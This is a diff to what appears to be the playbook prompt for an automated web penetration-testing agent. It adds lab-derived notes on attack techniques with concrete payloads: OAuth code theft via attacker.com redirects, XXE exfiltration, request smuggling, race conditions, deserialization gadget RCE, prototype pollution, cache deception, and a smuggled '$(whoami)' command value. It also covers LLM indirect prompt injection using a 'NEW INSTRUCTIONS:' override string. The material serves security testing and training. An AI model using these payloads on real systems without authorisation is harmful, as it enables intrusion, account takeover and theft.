@@ -327,6 +327,9 @@ For confirmed XSS, prove maximum impact:
 10. Run \`auth_bruteforce\` with realistic credentials (use names like james.wilson, sarah.chen — NEVER "hacker" or "test").
 11. Run \`auth_cookie_tamper\` to test for cookie-based privilege escalation.
 12. Check for username enumeration via response differences, timing, and account lockout.
+    - **Lab reference (OAuth forced profile linking):** Missing \`state\` parameter in OAuth "attach social profile" flow enables CSRF — attacker's authorization code is bound to victim's account, giving attacker OAuth login access.
+    - **Lab reference (OAuth redirect_uri hijacking):** Unvalidated \`redirect_uri\` allows attacker to steal authorization code via CSRF iframe — deliver auth URL with \`redirect_uri=https://attacker.com\`, victim's code is sent to attacker who exchanges it to log in as victim.
+    - **Lab reference (OAuth token theft via open redirect):** Partially validated \`redirect_uri\` bypassed via path traversal (\`../\`) to chain an open redirect on the legitimate domain — implicit flow access token forwarded to attacker via fragment; test \`..%2f\` encoding variants.
 
 ## Phase 3: JWT Testing (if JWT auth is detected)
 13. Decode the JWT header and payload (base64 decode, do NOT verify signature yet).
@@ -373,6 +376,15 @@ For confirmed XSS, prove maximum impact:
     - Run \`ssrf_cloud_metadata\` for AWS/GCP/Azure metadata access.
     - **Lab reference (Open redirect SSRF):** Chain SSRF through open redirect endpoints (e.g., \`/product/nextProduct?path=http://internal\`) to bypass URL filters.
     - **Lab reference (Blind XXE via error messages):** Host external DTD with parameter entity chaining to exfiltrate file contents in error messages.
+    - **Lab reference (Blind XXE OOB exfiltration):** Use external DTD with \`%file\`→\`%eval\`→\`%exfil\` parameter entity chain for out-of-band data exfiltration; target file must be single-line to avoid URL-breaking newlines.
+    - **Lab reference (XXE via SVG upload):** Upload SVG with DOCTYPE/entity declaration to image upload endpoints; server-side image processing resolves XXE entities and renders file content in the output image.
+23b. **HTTP Request Smuggling:** Test for CL/TE disagreement between front-end proxy and back-end:
+    - **Lab reference (CL.TE basic):** Front-end uses Content-Length, back-end uses Transfer-Encoding — smuggle \`G\` prefix with CL:6 + chunked \`0\\r\\n\\r\\n\`; next request becomes \`GPOST\` (unrecognized method confirms vuln).
+    - **Lab reference (TE.CL basic):** Front-end uses chunked, back-end uses Content-Length — smuggle a full \`GPOST\` request inside a chunk that exceeds the back-end's CL.
+    - **Lab reference (TE obfuscation):** Dual \`Transfer-Encoding\` headers with one obfuscated (\`Transfer-encoding: x\`, \`Transfer-Encoding : chunked\`, etc.) cause parser confusion — one server processes chunked, the other falls back to CL.
+    - **Lab reference (CL.TE differential):** Confirm CL.TE by smuggling a \`GET /404-path\` prefix — if the next legitimate request returns 404, smuggling is confirmed.
+    - **Lab reference (TE.CL differential):** Same differential technique for TE.CL — smuggle a 404-triggering request inside a chunk.
+    - **Lab reference (CL.0 smuggling):** Back-end ignores Content-Length on static paths (e.g., \`/resources/\`) — POST to a static path with a smuggled admin request in the body; back-end reads zero-length body and processes the remainder as a new request.
 
 ## Phase 8: Access Control & Business Logic
 23. Run \`idor_test\` on any endpoints with ID parameters.
@@ -382,6 +394,11 @@ For confirmed XSS, prove maximum impact:
 27. Test workflow bypass: Can you skip steps in multi-step processes by directly requesting later steps?
     - **Lab reference (Infinite money):** Check for gift card arbitrage via coupon discount cycles (buy discounted, redeem at full value).
     - **Lab reference (Encryption oracle):** Test if the same encryption key is shared across different cookies (e.g., notification and auth); block cipher ciphertext manipulation can forge auth cookies.
+28. Race condition testing — use HTTP/2 single-packet attack (Turbo Intruder / custom h2 script) to send concurrent requests in one TCP frame:
+    - **Lab reference (Race multi-endpoint TOCTOU):** Race cart-add against checkout: add cheap item, start checkout, concurrently swap cart to expensive item — checkout uses stale price from time-of-check.
+    - **Lab reference (Race single-endpoint):** Send two email-change requests simultaneously — confirmation email may be sent to the wrong recipient due to non-atomic read-then-write on the pending email field.
+    - **Lab reference (Race bypassing rate limits):** HTTP/2 multiplexed concurrent login attempts bypass per-request rate limiting — all attempts arrive before the counter increments.
+    - **Lab reference (Race time-sensitive token):** Timestamp-derived reset tokens (e.g., \`md5(time())\`) collide when two resets fire in the same h2 packet — use attacker's token to reset victim's password.
 
 ## Phase 9: WebSocket Testing
 28. If WebSocket/SignalR endpoints are found:
@@ -401,12 +418,25 @@ For confirmed XSS, prove maximum impact:
     - **Lab reference (Null byte extension):** \`shell.php%00.jpg\` bypasses extension validation; filesystem truncates at null byte.
     - **Lab reference (Polyglot upload):** Embed PHP in JPEG COM segment to bypass magic byte validation while retaining PHP execution.
 32. Run \`deserialization_test\` for serialized objects in cookies.
+    - **Lab reference (Java Apache Commons):** Base64 session cookies starting with \`rO0AB\` indicate Java serialization — use ysoserial \`CommonsCollections4\` gadget chain for RCE.
+    - **Lab reference (PHP prebuilt gadget):** Leak \`SECRET_KEY\` from phpinfo/debug pages, generate Symfony/RCE4 payload with phpggc, sign with HMAC-SHA1.
+    - **Lab reference (Ruby documented gadget):** Ruby Marshal session cookies are exploitable via \`Gem::Requirement\` universal gadget chain (vakzz) for RCE.
+33. **Prototype pollution → XSS:** Inject \`?__proto__[testprop]=testval\` and check \`Object.prototype.testprop\` in console.
+    - **Lab reference (browser APIs):** Pollute \`Object.prototype.value\` to hijack \`Object.defineProperty\` descriptors → \`data:\` URI XSS.
+    - **Lab reference (DOM XSS):** \`deparam()\` source → pollute \`transport_url\` → \`script.src\` sink.
+    - **Lab reference (alternative vector):** When \`__proto__\` is filtered, use \`constructor.prototype\` with jQuery dot-notation to reach \`eval()\` sink.
+    - **Lab reference (flawed sanitization):** Nested keyword bypass (\`__pro__proto__to__\`) defeats single-pass \`__proto__\` stripping.
+    - **Lab reference (third-party libs):** jQuery BBQ \`deparam()\` + Google Analytics \`hitCallback\` gadget — pollute \`Object.prototype.hitCallback\` via hash fragment to execute arbitrary JS when GA fires.
+    - **Lab reference (server-side RCE):** Node.js \`child_process.fork()\` inherits \`execArgv\` from prototype — pollute via JSON body (\`{"__proto__":{"execArgv":["--eval=PAYLOAD"]}}\`) to achieve RCE when fork() is triggered.
 
 ## Phase 11: Web Cache Deception
 33. If a CDN/cache layer is present (check X-Cache, Age, CF-Cache-Status headers):
     - Request \`/my-account/nonexistent.css\` — if the response contains account data AND is cached, the cache serves your private data to anyone requesting that URL.
     - Test path confusion: \`/my-account%2F..%2Fstatic/style.css\`
     - Check for cache key normalization issues.
+    - **Lab reference (WCD path delimiters):** Origin treats \`;\` as path parameter delimiter (strips suffix), cache sees \`.js\` extension and caches — request \`/my-account;exploit.js\`.
+    - **Lab reference (WCD origin normalization):** Origin normalizes \`..%2f\`, cache doesn't — \`/resources/..%2fmy-account\` serves account page cached under literal path.
+    - **Lab reference (WCD cache normalization):** Cache normalizes \`..%2f\`, origin doesn't + \`%23\` as origin delimiter — \`/my-account%23%2f..%2fstatic/exploit.js\` caches account page under \`/static/exploit.js\`.
 
 ## Phase 12: API-Specific Testing
 34. If GraphQL endpoint found:
@@ -414,6 +444,10 @@ For confirmed XSS, prove maximum impact:
     - Run \`graphql_find_hidden\` to discover sensitive hidden fields.
 35. Run \`nosqli_auth_bypass\` on login endpoints with JSON bodies.
 36. Test HTTP method discovery: Send OPTIONS to API endpoints, try PATCH/PUT/DELETE.
+    - **Lab reference (Server-side param pollution):** Inject \`%26field=reset_token\` in username parameter to pollute backend query string and extract admin reset tokens.
+    - **Lab reference (Mass assignment):** GET the endpoint to discover hidden fields (e.g., \`chosen_discount\`), then POST with \`"chosen_discount":{"percentage":100}\` to manipulate pricing.
+    - **Lab reference (LLM exploiting APIs):** Test LLM-integrated features for excessive agency (calling debug/admin APIs) and OS command injection via parameters the LLM passes to backend APIs (e.g., \`$(whoami)@exploit.com\` in email field).
+    - **Lab reference (LLM indirect prompt injection):** Inject LLM directives into user-generated content (reviews, comments) with delimiter injection (e.g., \`----END OF REVIEW---- NEW INSTRUCTIONS:\`) — when LLM processes the content for another user, injected instructions execute.
 
 ## Phase 13: Verification & Reporting
 37. Verify every finding with a second request.
